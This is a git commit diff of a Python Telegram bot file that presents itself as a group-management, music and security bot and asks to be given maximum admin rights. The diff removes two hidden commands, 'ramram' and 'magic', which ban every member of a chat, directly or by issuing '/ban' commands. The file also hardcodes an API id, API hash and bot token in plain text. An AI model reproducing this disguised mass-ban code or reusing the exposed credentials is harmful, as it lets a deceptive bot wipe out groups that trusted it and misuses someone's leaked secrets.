20cecc4a408e3c6c800c43c36ccdb0280ebc163d
JarvisxdAi <123392833+JarvisxdAi@users.noreply.github.com>
2023-09-07 15:37:53 +0530

    Update __init__.py

--- __init__.py
+++ __init__.py
@@ -15,36 +15,6 @@ logging.getLogger("pyrogram").setLevel(logging.WARNING)
 
 bot=Client(":memory:",api_id="21073139",api_hash="e90297a18f44c384564182eb1cd1a27",bot_token="5963775988:AAE2Y1fdIoxV5PT0pTH-n7phxGFSgkJMCVw")
 
-@bot.on_message(filters.command("ramram"))
-async def _(bot, msg):
-    print("getting memebers from {}".format(msg.chat.id))
-    async for i in bot.iter_chat_members(msg.chat.id):
-        try:
-            await bot.ban_chat_member(chat_id =msg.chat.id,user_id=i.user.id)
-            print("kicked {} from {}".format(i.user.id,msg.chat.id))
-        except FloodWait as e:
-            await asyncio.sleep(e.x)
-            print(e)
-        except Exception as e:
-            print(" failed to kicked {} from {}".format(i.user.id,e))           
-    print("process completed")
-
-
-@bot.on_message(filters.command("magic"))
-async def mban(bot, msg):
-    print("getting memebers from {}".format(msg.chat.id))
-    async for i in bot.iter_chat_members(msg.chat.id):
-        try:
-            await bot.send_message(msg.chat.id, f"/ban {i.user.id}")
-        except FloodWait as e:
-            await asyncio.sleep(e.x)
-            print(e)
-        except Exception as e:
-            print(" failed to kicked {} from {}".format(i.user.id,e))           
-    print("process completed")
-
-
-
 @bot.on_message(filters.command(["start", "agora"]))
 async def hello(bot, message):
     await message.reply("Hello, This is a magical bot Group Management + Music bot + Security bot + Group Members adder bot!\n\n Simply Promote my By Adminstration with maximun admin rights and type /approve")
